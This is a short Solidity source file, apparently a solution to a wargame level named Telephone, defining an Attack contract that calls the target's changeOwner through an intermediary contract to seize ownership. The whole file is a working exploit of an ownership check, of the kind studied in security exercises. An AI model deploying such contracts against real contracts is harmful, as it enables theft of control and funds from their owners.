// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack {
    Telephone private target;

    address private owner; 
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    constructor(address _addr) payable{
        target = Telephone(_addr);
        owner = msg.sender;
    }

    function changeOwner(address _owner) external onlyOwner {
        target.changeOwner(_owner);
    }
}